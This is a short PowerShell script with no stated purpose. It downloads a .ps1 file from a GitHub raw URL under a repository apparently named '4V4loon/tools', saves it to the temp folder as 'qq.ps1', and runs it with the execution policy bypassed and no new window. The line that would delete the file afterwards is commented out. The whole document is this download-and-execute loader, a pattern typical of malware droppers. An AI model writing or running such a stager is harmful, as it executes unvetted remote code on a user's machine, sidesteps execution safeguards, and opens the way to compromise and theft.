$url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
$file="$env:tmp\qq.ps1"
Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
Start-Process -FilePath powershell.exe -ArgumentLis "-executionpolicy bypass -file $file" -NoNewWindow
# remove-item -Path $file -Force
